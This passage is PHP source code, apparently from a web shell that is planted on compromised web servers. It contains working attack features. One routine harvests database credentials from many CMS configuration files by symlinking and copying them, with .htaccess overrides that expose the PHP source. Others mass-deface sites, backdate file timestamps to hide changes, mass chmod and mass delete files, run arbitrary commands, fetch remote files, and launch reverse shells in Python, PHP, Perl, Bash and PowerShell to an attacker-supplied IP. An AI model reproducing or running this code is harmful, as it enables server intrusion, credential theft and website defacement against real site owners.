                copy($userHome . "/public_html/test/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/v1/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/v2/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/joomla/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/new/configuration.php", $user . "  JOOMLA.txt");
                copy($userHome . "/public_html/app/etc/local.xml", $user . "  MAGENTO.txt");
                copy($userHome . "/public_html/config/settings.inc.php", $user . "  PRESTASHOP.txt");
                copy($userHome . "/public_html/application/config/database.php", $user . "  ELLISLAB.txt");
                copy($userHome . "/public_html/admin/config.php", $user . "  OPENCART.txt");
                copy($userHome . "/public_html/default/settings.php", $user . "  DRUPAL.txt");
                copy($userHome . "/public_html/forum/config.php", $user . "  PHPBB.txt");
                copy($userHome . "/public_html/vb/includes/config.php", $user . "  VBULLETIN.txt");
                copy($userHome . "/public_html/includes/config.php", $user . "  VBULLETIN.txt");
                copy($userHome . "/public_html/forum/includes/config.php", $user . "  VBULLETIN.txt");
                copy($userHome . "/public_htm/config.php", $user . "  OTHER.txt");
                copy($userHome . "/public_htm/html/config.php", $user . "  PHPNUKE.txt");
                copy($userHome . "/public_htm/conn.php", $user . "  OTHER.txt");
                copy($userHome . "/public_html/conn.php", $user . "  OTHER.txt");
                copy($userHome . "/public_html/inc/config.inc.php", $user . "  OTHER.txt");
                copy($userHome . "/public_html/application/config/database.php", $user . "  OTHER.txt");
                copy("/var/www/wp-config.php", "WORDPRESS.txt");
                copy("/var/www/configuration.php", "JOOMLA.txt");
                copy("/var/www/config.inc.php", "OPENJOURNAL.txt");
                copy("/var/www/config.php", "OTHER.txt");
                copy("/var/www/config/koneksi.php", "OTHER.txt");
                copy("/var/www/include/config.php", "OTHER.txt");
                copy("/var/www/connect.php", "OTHER.txt");
                copy("/var/www/config/connect.php", "OTHER.txt");
                copy("/var/www/include/connect.php", "OTHER.txt");
                copy("/var/www/html/wp-config.php", "WORDPRESS.txt");
                copy("/var/www/html/configuration.php", "JOOMLA.txt");
                copy("/var/www/html/config.inc.php", "OPENJOURNAL.txt");
                copy("/var/www/html/config.php", "OTHER.txt");
                copy("/var/www/html/config/koneksi.php", "OTHER.txt");
                copy("/var/www/html/include/config.php", "OTHER.txt");
                copy("/var/www/html/connect.php", "OTHER.txt");
                copy("/var/www/html/config/connect.php", "OTHER.txt");
                copy("/var/www/html/include/connect.php", "OTHER.txt");
                symlink("/var/www/wp-config.php", "WORDPRESS.txt");
                symlink("/var/www/configuration.php", "JOOMLA.txt");
                symlink("/var/www/config.inc.php", "OPENJOURNAL.txt");
                symlink("/var/www/config.php", "OTHER.txt");
                symlink("/var/www/config/koneksi.php", "OTHER.txt");
                symlink("/var/www/include/config.php", "OTHER.txt");
                symlink("/var/www/connect.php", "OTHER.txt");
                symlink("/var/www/config/connect.php", "OTHER.txt");
                symlink("/var/www/include/connect.php", "OTHER.txt");
                symlink("/var/www/html/wp-config.php", "WORDPRESS.txt");
                symlink("/var/www/html/configuration.php", "JOOMLA.txt");
                symlink("/var/www/html/config.inc.php", "OPENJOURNAL.txt");
                symlink("/var/www/html/config.php", "OTHER.txt");
                symlink("/var/www/html/config/koneksi.php", "OTHER.txt");
                symlink("/var/www/html/include/config.php", "OTHER.txt");
                symlink("/var/www/html/connect.php", "OTHER.txt");
                symlink("/var/www/html/config/connect.php", "OTHER.txt");
                symlink("/var/www/html/include/connect.php", "OTHER.txt");
                $results[] = "<li><span style='color: #28a745;'>Success:</span> Symlinks and copies created for user $user in $folfig</li>";
            }
        }
        echo '<div class="card card-body mb-3" style="background-color: #41464b;">';
        if (!empty($results)) {
            echo '<span class="text-light"><strong>Symlink Extraction Successful!</strong></span> ' . ok() . '<ul class="text-light">' . implode('', $results) . '</ul>';
        } else {
            echo '<span class="text-light"><strong>Symlink Extraction Failed!</strong></span> ' . er() . '<ul class="text-light"><li><span style="color: #dc3545;">No valid users processed.</span></li></ul>';
        }
        echo '</div>';
    }
    echo "
    <div class='card card-body mb-3' style='background-color: #ffffff;'>
        <form method='POST' id='symlinkForm'>
            <input type='hidden' name='id' value='symlink'>
            <div class='d-grid gap-2'>
                <label class='text-dark'>User List (one per line):</label>
                <textarea class='form-control btn-sm text-dark' name='passwd' rows='10' placeholder='Enter usernames (e.g., user1\nuser2)'></textarea>
                <label class='text-dark'>Home Directory:</label>
                <select class='form-control btn-sm text-dark' name='home'>
                    <option value='home'>home</option>
                    <option value='home1'>home1</option>
                    <option value='home2'>home2</option>
                    <option value='home3'>home3</option>
                    <option value='home4'>home4</option>
                    <option value='home5'>home5</option>
                    <option value='home6'>home6</option>
                    <option value='home7'>home7</option>
                    <option value='home8'>home8</option>
                    <option value='home9'>home9</option>
                    <option value='home10'>home10</option>
                    <option value='home_cpanel'>home_cpanel</option>
                </select>
                <label class='text-dark'>.htaccess Option:</label>
                <select class='form-control btn-sm text-dark' name='achon666ju5t'>
                    <option value='Options Indexes FollowSymLinks\nDirectoryIndex symlink.extremecrew\nAddType txt .php\nAddHandler txt .php'>Apache 1</option>
                    <option value='Options all\nOptions +Indexes\nOptions +FollowSymLinks\nDirectoryIndex symlink.extremecrew\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any'>Apache 2</option>
                    <option value='Options +FollowSymLinks\nDirectoryIndex symlink.extremecrew\nRemoveHandler .php\nAddType application/octet-stream .php'>Litespeed</option>
                </select>
                <input class='btn btn-sm' type='submit' name='conf' value='Start' style='background-color: #41464b; border-color: #ffffff; color: #ffffff;'>
            </div>
        </form>
    </div>";
}

    // mass deface
    if ($_1337["id"] == "deface") {
        function mass_all($dir, $namefile, $contents_sc)
        {
            if (is_writable($dir)) {
                $dira = scandir($dir);
                foreach ($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $lapet = $dirc . "/" . $namefile;
                    if ($dirb === ".") {
                        file_put_contents($lapet, $contents_sc);
                    } elseif ($dirb === "..") {
                        file_put_contents($lapet, $contents_sc);
                    } else {
                        if (is_dir($dirc)) {
                            if (is_writable($dirc)) {
                                echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$lapet<br>";
                                file_put_contents($lapet, $contents_sc);
                                $coek = mass_all($dirc, $namefile, $contents_sc);
                            }
                        }
                    }
                }
            }
        }
        function mass_onedir($dir, $namefile, $contents_sc)
        {
            if (is_writable($dir)) {
                $dira = scandir($dir);
                foreach ($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $lapet = $dirc . "/" . $namefile;
                    if ($dirb === ".") {
                        file_put_contents($lapet, $contents_sc);
                    } elseif ($dirb === "..") {
                        file_put_contents($lapet, $contents_sc);
                    } else {
                        if (is_dir($dirc)) {
                            if (is_writable($dirc)) {
                                echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
                                file_put_contents($lapet, $contents_sc);
                            }
                        }
                    }
                }
            }
        }
        if ($_1337["start"]) {
            if ($_1337["tipe"] == "mass") {
                mass_all($_1337["d_dir"], $_1337["d_file"], $_1337["script"]);
            } elseif ($_1337["tipe"] == "onedir") {
                mass_onedir($_1337["d_dir"], $_1337["d_file"], $_1337["script"]);
            }
        }
        s();
        echo '<center class="anu">Mass Deface</center>';
        echo "
		<div class='card card-body text-dark input-group mb-3'>
			<form method='POST'> Select Type:
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
				<label class='form-check-label' for='flexCheckDefault'>One directory</label>
			</div>
			<div class='form-check'>
				<input class='form-check-input' type='checkbox' value='mass' name='tipe' id='flexCheckDefault'>
				<label class='form-check-label' for='flexCheckDefault'>All directory</label>
			</div>
				<i class='bi bi-folder'></i> Directory:
				<input class='form-control btn-sm text-dark' type='text' name='d_dir' value='".htmlspecialchars($dir)."/'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='kobe.txt'>
				<i class='bi bi-code-square'></i> Your Script:
				<textarea class='form-control btn-sm text-dark' rows='7' name='script' placeholder='Hacked by Kobe'></textarea>
				<div class='d-grid gap-2'>
					<input class='btn btn-dark btn-sm' type='submit' name='start' value='Submit!'>
				</div>
			</form>
		</div>";
    }
    // mass change date
    if ($_1337["id"] == "masschdte") {
        s();
        echo '<center class="anu">Mass Update Modification Date for All File/Dir</center>';
        echo '
        <div class="card card-body text-dark input-group mb-3">
            <form method="POST">
                <i class="bi bi-folder"></i> Directory:
                <input class="form-control btn-sm text-dark" type="text" name="dir" value="'.htmlspecialchars($dir).'/">
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="target_type" value="file" checked>
                    <label class="form-check-label" for="file">File</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="target_type" value="dir">
                    <label class="form-check-label" for="dir">Directory</label>
                </div>
                <i class="bi bi-calendar3"></i> Modification Date:
                <input class="form-control btn-sm text-dark" type="text" name="modification_date" placeholder="YYYY-MM-DD HH:MM:SS">
                <div class="d-grid gap-2">
                    <input class="btn btn-dark btn-sm" type="submit" name="change" value="Submit!">
                </div>
            </form>
        </div>';
    function massUpdateModDate($dir, $targetType, $modDate, &$changedFiles = [])
    {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
        if (
            ($targetType === "file" && is_file($fullPath)) ||
            ($targetType === "dir" && is_dir($fullPath))
        ) {
            if (isset($_POST["change"])) {
                $dateParts = explode(" ", $modDate);
                $date = date_parse($dateParts[0]);
                $time = isset($dateParts[1]) ? explode(":", $dateParts[1]) : [0, 0, 0];
                $hour = isset($time[0]) ? $time[0] : 0;
                $minute = isset($time[1]) ? $time[1] : 0;
                $second = isset($time[2]) ? $time[2] : 0;
                $timeStamp = mktime($hour, $minute, $second, $date['month'], $date['day'], $date['year']);
                if (touch($fullPath, $timeStamp)) {
                    $changedFiles[] = $fullPath;
                }
            }
        }
        if (is_dir($fullPath)) {
            massUpdateModDate($fullPath, $targetType, $modDate, $changedFiles);
        }
    }
}
        if (isset($_POST["change"])) {
            $dir = $_POST["dir"];
            $targetType = $_POST["target_type"];
            $modDate = $_POST["modification_date"];
            $changedFiles = [];
            massUpdateModDate($dir, $targetType, $modDate, $changedFiles);
    
            if (!empty($changedFiles)) {
                echo '<div class="card card-body text-dark">';
                echo "<p>Updated Modification Date to <em>$modDate</em></p>";
                echo "<ul>";
                foreach ($changedFiles as $changedFile) {
                    echo "<li>$changedFile</li>";
                }
                echo "</ul>";
                echo "</div>";
            }
        }
    }    
    // mass chmod all file/dir
    if ($_1337["id"] == "masschemod") {
        s();
        echo '<center class="anu">Mass Change Permissions (Chmod) All File/Dir</center>';
        echo '
    <div class="card card-body text-dark input-group mb-3">
        <form method="POST">
            <i class="bi bi-folder"></i> Directory:
            <input class="form-control btn-sm text-dark" type="text" name="dir" value="'.htmlspecialchars($dir).'/">
            <div class="form-check">
                <input class="form-check-input" type="radio" name="target_type" value="file" checked>
                <label class="form-check-label" for="file">File</label>
            </div>
            <div class="form-check">
                <input class="form-check-input" type="radio" name="target_type" value="dir">
                <label class="form-check-label" for="dir">Directory</label>
            </div>
            <i class="bi bi-file-earmark"></i> Permissions:
            <input class="form-control btn-sm text-dark" type="text" name="permission" placeholder="0777">
            <div class="d-grid gap-2">
                <input class="btn btn-dark btn-sm" type="submit" name="change" value="Submit!">
            </div>
        </form>
    </div>';

    function massChmod($dir, $targetType, $permission, &$changedFiles = [])
    {
        // Scan directory including files starting with '.'
        $files = scandir($dir);
    
        foreach ($files as $file) {
            // Skip current and parent directory ('.' and '..')
            if ($file === '.' || $file === '..') {
                continue;
            }
    
            $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
    
            // Check if it's a file or directory and matches the target type
            if (
                ($targetType === "file" && is_file($fullPath)) ||
                ($targetType === "dir" && is_dir($fullPath))
            ) {
                if (isset($_POST["change"])) {
                    if (chmod($fullPath, octdec($permission))) {
                        $changedFiles[] = $fullPath;
                    }
                }
            }
    
            // Recursively scan subdirectories
            if (is_dir($fullPath)) {
                massChmod($fullPath, $targetType, $permission, $changedFiles);
            }
        }
    }
    
    if (isset($_POST["change"])) {
        $dir = $_POST["dir"];
        $targetType = $_POST["target_type"];
        $permission = $_POST["permission"];
        $changedFiles = [];
        massChmod($dir, $targetType, $permission, $changedFiles);
    
        if (!empty($changedFiles)) {
            echo '<div class="card card-body text-dark">';
            echo "<p>Change Permissions to <em>$permission</em></p>";
            echo "<ul>";
            foreach ($changedFiles as $changedFile) {
                echo "<li>$changedFile</li>";
            }
            echo "</ul>";
            echo "</div>";
        }
    }
}
    
    // find file using keyword
    if ($_1337["id"] == "findkey") {
        s();
echo '<div class="container-fluid">
    <center class="anu">Find File Using Keyword</center>
    <div class="card card-body text-dark input-group mb-3">
        <div class="container-fluid mt-1">
            <form method="post">
                <div class="form-group">
                    <i class="bi bi-folder"></i> <label for="path"> Directory: </label>
                    <input type="text" name="path" class="form-control form-control-sm text-dark flex-grow-1" value="'.$dir.'/">
                </div>
                <i class="bi bi-search"></i> <label for="keyword"> Keyword: </label>
                <input type="text" name="keyword" class="form-control form-control-sm text-dark flex-grow-1" placeholder="eval, phpinfo etc." required>

                <div class="input-group">
                <i class="bi bi-file-earmark"></i> <label for="extension"> &nbsp;Extension: &nbsp;</label>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="extension" id=".php" value=".php" checked>
                        <label class="form-check-label" for=".php"> php&nbsp;&nbsp; </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="extension" id=".html" value=".html">
                        <label class="form-check-label" for=".html"> html&nbsp;&nbsp; </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="extension" id=".txt" value=".txt">
                        <label class="form-check-label" for=".txt"> txt&nbsp;&nbsp; </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="extension" id="all" value="all">
                        <label class="form-check-label" for="all"> All&nbsp; </label>
                    </div>
                </div>
                <div class="d-grid gap-2">
                    <input class="btn btn-dark btn-sm" type="submit" name="custom_extension" value="Submit!">
                </div>
            </form>
        </div>
    </div>';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $keyword = $_POST["keyword"];
    $path = isset($_POST["path"]) ? $_POST["path"] : '.';
    $extension = $_POST["extension"];

    if ($extension === "all") {
        $files = glob("$path/*");
    } else {
        $files = glob("$path/*$extension");
    }

    $matching_files = [];

    foreach ($files as $file) {
        if (is_file($file) && strpos(file_get_contents($file), $keyword) !== false) {
            $matching_files[] = $file;
        }
    }

    if (!empty($matching_files)) {
        echo '<div class="card card-body text-dark">Searching '.$keyword.' on '.$extension.' extension.<ul>';
        foreach ($matching_files as $matching_file) {
            echo '<li>' . $matching_file . '</li>';
        }
        echo '</ul></div>';
    } else {
        echo '<p>No matching files found.</p>';
    }
}


    }
    // find recent files
    if ($_1337["id"] == "findmtime") {
        s();
        echo '<div class="container-fluid">
<center class="anu">Find Modified Files</center>
<div class="card card-body text-dark input-group mb-3">
    <div class="container-fluid mt-1">
        <form method="POST">
            <div class="form-group">
                 <i class="bi bi-folder"></i><label for="custom_path">&nbsp; Directory:</label>
                <input type="text" class="form-control form-control-sm text-dark flex-grow-1" name="custom_path" id="custom_path" value="'.    $dir.    '" required>
            </div>
            <div class="input-group">
                <i class="bi bi-calendar-date"></i> <label for="time_range">&nbsp;Modified Date:&nbsp;&nbsp;</label>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="time_range" id="1min" value="1min" checked>
                    <label class="form-check-label" for="1min">1 Minute&nbsp;&nbsp;</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="time_range" id="1day" value="1day">
                    <label class="form-check-label" for="1day">1 Day&nbsp;&nbsp;</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="time_range" id="10days" value="10days">
                    <label class="form-check-label" for="10days">10 Days&nbsp;&nbsp;</label>
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="radio" name="time_range" id="1month" value="1month">
                    <label class="form-check-label" for="1month">1 Month&nbsp;&nbsp;</label>
                </div>
            </div>
            <div class="d-grid gap-2">
                <input class="btn btn-dark btn-sm" type="submit" name="scan" value="Submit!">
            </div>
        </form>
    </div>
</div>
</div>';

function getModifiedFiles($path, $startTime, $endTime)
{
    $files = [];

    $dirContent = scandir($path);
    foreach ($dirContent as $item) {
        if ($item != '.' && $item != '..') {
            $itemPath = $path . '/' . $item;

            if (is_dir($itemPath)) {
                $subDirFiles = getModifiedFiles($itemPath, $startTime, $endTime);
                $files = array_merge($files, $subDirFiles);
            } else {
                $modifiedTime = filemtime($itemPath);
                if ($modifiedTime >= $startTime && $modifiedTime <= $endTime) {
                    $files[] = $itemPath;
                }
            }
        }
    }

    return $files;
}

$customPath = isset($_POST["custom_path"]) ? $_POST["custom_path"] : getcwd();
if (isset($_POST["scan"])) {
    $currentDateTime = new DateTime();
    $startTime = $currentDateTime->getTimestamp();

    $selectedRange = $_POST["time_range"];
    switch ($selectedRange) {
        case "1min":
            $endTime = $startTime - 60;
            break;
        case "1day":
            $endTime = $startTime - 60 * 60 * 24;
            break;
        case "10days":
            $endTime = $startTime - 60 * 60 * 24 * 10;
            break;
        case "1month":
            $endTime = $startTime - 60 * 60 * 24 * 30;
            break;
        default:
            $endTime = $startTime;
    }

    $modifiedFiles = getModifiedFiles($customPath, $endTime, $startTime);
    echo '<div class="card card-body text-dark"><ul>';
    foreach ($modifiedFiles as $file) {
        echo "<li>$file <gr> -> File modified at {$currentDateTime->format("Y-m-d H:i:s")}</gr></li>";
    }
    echo "</ul></div>";
}
    
}
// mass delete
if ($_1337["id"] == "delete") {
    function mass_delete($dir, $namefile)
    {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lapet = $dirc . "/" . $namefile;
                if ($dirb === "." || $dirb === "..") {
                    continue;
                }
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        if (file_exists($lapet)) {
                            echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$lapet<br>";
                            unlink($lapet);
                        }
                        mass_delete($dirc, $namefile);
                    }
                }
            }
        }
    }
    if ($_1337["start"]) {
        mass_delete($_1337["d_dir"], $_1337["d_file"]);
    }
    s();
    echo '<center class="anu">Mass Delete</center>';
    echo "
    <div class='card card-body text-dark input-group mb-3'>
        <form method='POST'>
            <i class='bi bi-folder'></i> Directory:
            <input class='form-control btn-sm text-dark' type='text' name='d_dir' value='$dir/' $_r>
                <i class='bi bi-file-earmark'></i> Filename:
            <div class='input-group'>
                <input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='$resoolt' $_r><br>
                <div class='input-group-append'>
                    <input class='btn btn-dark btn-sm' type='submit' name='start' value='Delete!'>
                </div>
            </div>
        </form>
    </div>";
}
    // back connect
    if ($_1337["id"] == "revsh") {
        s();
        echo '<center class="anu">Reverse Shell</center>';
        echo "<div class='card card-body text-dark input-group mb-3'>
	<form method='post'>
    <i class='bi bi-hdd-network'></i> IP Address:
			<input type='text' class='form-control btn-sm text-dark' name='ip' placeholder='IP'>
            <i class='bi bi-hdd'></i> Port:
			<input type='text' class='form-control btn-sm text-dark' name='port' placeholder='Port'>
            <i class='bi bi-hdd-network'></i> Reverse Shell using:
			<select class='form-control btn-sm text-dark' name='backdoor'>
				<option value='1'>Python</option>
                <option value='2'>Python3</option>
				<option value='3'>PHP</option>
				<option value='4'>Perl</option>
				<option value='5'>Bash</option>
                <option value='6'>Windows (Powershell)</option>
			</select>
        <div class='d-grid gap-2'><button type='submit' class='btn btn-dark btn-sm' name='submit'>Submit!</button></div>
	</form></div><br>";
if(isset($_POST['submit'])){
    $backdoor = $_POST['backdoor'];
    $ip = $_POST['ip'];
    $port = $_POST['port'];
  if($backdoor == 1){
    $command = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
  }elseif($backdoor == 2){
    $command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); subprocess.call([\"/bin/sh\",\"-i\"]);'";
  }elseif($backdoor == 3){
      $command = "php -r '\$sock=fsockopen(\"$ip\",$port);stream_set_blocking(\$sock, 0);\$cmd=\"/bin/sh -i\";proc_close(proc_open(\$cmd, array(0=>\$sock, 1=>\$sock, 2=>\$sock), \$foo));'";
  }elseif($backdoor == 4){
      $command = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
  }elseif($backdoor == 5){
      $command = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
  }elseif($backdoor == 6){
      $command = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\'$ip\',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()';
  }
  if (function_exists('system')) {
    system($command);
} elseif (function_exists('exec')) {
    exec($command);
} elseif (function_exists('shell_exec')) {
    shell_exec($command);
} elseif (function_exists('passthru')) {
    passthru($command);
} elseif (function_exists('popen')) {
    $handle = popen($command, 'r');
    if ($handle) {
        while (!feof($handle)) {
            echo fgets($handle, 4096);
        }
        pclose($handle);
    }
} else {
    proc_open($command, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")), $pipes);
}
//tambahan buat backticks
echo `$command`;
}
}
    // command
    if ($_1337["id"] == "cmd") {
        s();
        echo '<center class="anu">Command (Use Many Functions!)</center>';
        if (!empty($_POST["cmd"])) {
            $cmd = exe($_POST["cmd"]);
        }
        echo "<div class='mb-3'>
            <form method='POST'>
                <div class='input-group mb-3'>
                    <input class='form-control btn-sm text-dark' type='text' name='cmd' value='" . htmlspecialchars($_POST["cmd"], ENT_QUOTES, "UTF-8") . "' placeholder='whoami' $_r>
                    <button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-emoji-smile-upside-down'></i></button>
                </div>
            </form>";
        if (isset($cmd)):
            echo '<div class="container-fluid language-javascript">
                <div class="shell mb-3">
                    <pre style="font-size:10px;">$&nbsp;<rd>' . htmlspecialchars($_POST["cmd"], ENT_QUOTES, "UTF-8") . "</rd><br><code>" . htmlspecialchars($cmd, ENT_QUOTES, "UTF-8") . '</code></pre>
                </div>
            </div>';
        elseif ($_SERVER["REQUEST_METHOD"] == "POST"):
            echo '
            <div class="container-fluid language-javascript">
                <div class="shell mb-3">
                    <pre style="font-size:10px;"><code>No result</code></pre>
                </div>
            </div>
        </div>';
        endif;
    }
    
    // multiple file upload
    if ($_1337["id"] == "upload") {
    s();
    echo '<center class="anu">Multiple File Upload (From URL + Your Computer)</center>';
    $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["url"]) && isset($_POST["output_filename"]) && isset($_POST["method"])) {
        $url = $_POST["url"];
        $outputFilename = $_POST["output_filename"];
        $method = $_POST["method"];
        $fileUploaded = false;

        switch ($method) {
            case 'file_get_contents':
                $context = stream_context_create([
                    'http' => ['header' => "User-Agent: $userAgent"]
                ]);
                $file_content = @file_get_contents($url, false, $context);
                if ($file_content !== false) {
                    $fileUploaded = file_put_contents($outputFilename, $file_content);
                }
                break;

            case 'curl':
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
                $data = curl_exec($ch);
                curl_close($ch);
                if ($data !== false) {
                    $fileUploaded = file_put_contents($outputFilename, $data);
                }
                break;

            case 'fopen':
                $readHandle = @fopen($url, 'rb');
                $writeHandle = @fopen($outputFilename, 'wb');
                if ($readHandle && $writeHandle) {
                    while (!feof($readHandle)) {
                        fwrite($writeHandle, fread($readHandle, 8192));
                    }
                    $fileUploaded = true;
                }
                if ($readHandle) fclose($readHandle);
                if ($writeHandle) fclose($writeHandle);
                break;

            case 'copy':
                $context = stream_context_create([
                    'http' => ['header' => "User-Agent: $userAgent"]
                ]);
                $fileUploaded = @copy($url, $outputFilename, $context);
                break;

            case 'stream_context':
                $context = stream_context_create([
                    'http' => ['method' => 'GET', 'header' => "User-Agent: $userAgent"]
                ]);
                $file_content = @file_get_contents($url, false, $context);
                if ($file_content !== false) {
                    $fileUploaded = file_put_contents($outputFilename, $file_content);
                }
                break;

            case 'file':
                $context = stream_context_create([
                    'http' => ['header' => "User-Agent: $userAgent"]
                ]);
                $file_content = @file($url, false, $context);
                if ($file_content !== false) {
                    $fileUploaded = file_put_contents($outputFilename, implode("", $file_content));
                }
                break;

            default:
                echo "<div class='alert alert-danger'><strong>Invalid method specified.</strong></div>";
                exit;
        }

        if ($fileUploaded && filesize($outputFilename) > 0) {
            echo "<div class='alert alert-success'><strong>Upload OK!</strong></div>";
        } else {
            echo "<div class='alert alert-danger'><strong>Failed to download file or file size is 0 byte, try to change methods.</strong></div>";
        }
    }
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["file"])) {
        $result = count($_FILES["file"]["name"]);
        for ($contents = 0; $contents < $result; $contents++) {
            $namefile = $_FILES["file"]["name"][$contents];
            $tmp_name = $_FILES["file"]["tmp_name"][$contents];
            $destination = "$path/" . $namefile;
            $up = false;
            if ($_FILES["file"]["size"][$contents] > 0) {
                $up = move_uploaded_file($tmp_name, $destination);
            }
            if (!$up || filesize($destination) === 0) {
                $up = @copy($tmp_name, $destination);
    
                if (!$up || filesize($destination) === 0) {
                    $fileContent = @file_get_contents($tmp_name);
                    if ($fileContent !== false) {
                        $up = file_put_contents($destination, $fileContent) !== false;
                    }
                }
            }
    
            if ($up && filesize($destination) > 0) {
                $downloadLink = $urlwebsite . str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath(getcwd())) . '/' . basename($namefile);
                echo "<div class='alert alert-success'><strong>Upload OK!</strong></div>";
            } else {
                echo "<div class='alert alert-danger'><strong>Upload FAILED!</strong></div>";
            }
        }
    }
    echo '<div class="card card-body text-dark input-group mb-3">
    <form action="" method="post">
    <div class="form-group d-flex align-items-center">
        <input type="text" class="form-control form-control-sm text-dark flex-grow-1" placeholder="https://example.go.id/files/kobeprivate.txt" name="url" id="url" required>
        <input type="text" class="form-control form-control-sm text-dark" name="output_filename" placeholder="saved.txt" id="output_filename" required style="width: 300px;">
        <select class="form-control form-control-sm text-dark" name="method" id="method" required style="width: 200px;">
            <option value="file_get_contents">file_get_contents</option>
            <option value="curl">cURL</option>
            <option value="fopen">fopen</option>
            <option value="copy">copy</option>
            <option value="stream_context">stream_context</option>
            <option value="file">file</option>
        </select>
        <button class="btn btn-dark btn-sm" type="submit" name="upl">Save!</button>
    </div>
    </form>		
        <form method="POST" enctype="multipart/form-data">
            <div class="input-group">
                <input class="form-control form-control-sm text-dark" type="file" name="file[]" multiple="">
                <div class="input-group-append">
                    <button class="btn btn-dark btn-sm" type="submit" name="upl">Upload!</button>
                </div>
            </div>
        </form>
    </div>
    </div>';
}
// openfile
if (isset($_1337["opn"])) {
    $file = $_1337["opn"];
}
// view
if ($_1337["action"] == "view") {
    s();
    echo "<div class='btn-group'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delfile&opn=$file'><i class='bi bi-trash-fill'></i></a>

		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<div class='bg-dark'>
			<div class='container-fluid language-javascript'>
				<textarea rows='10' class='form-control' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea>
			</div>
		</div>";
}
// edit
if (isset($_1337["edit_file"])) {
    $file = "$file";
    $contents = $_1337["contents"];
    $updt = fopen($file, "w");
    $result = fwrite($updt, $contents);
    fclose($updt);
    if ($result && filesize($file) > 0) {
        echo "<strong>Edit file OK! " . ok() . "</strong></div>";
    } else {
        $result = file_put_contents($file, $contents);
        
        if (!$result) {
            $tmpFile = tempnam(sys_get_temp_dir(), 'tmp');
            file_put_contents($tmpFile, $contents);
            @copy($tmpFile, $file);

            if (filesize($file) > 0) {
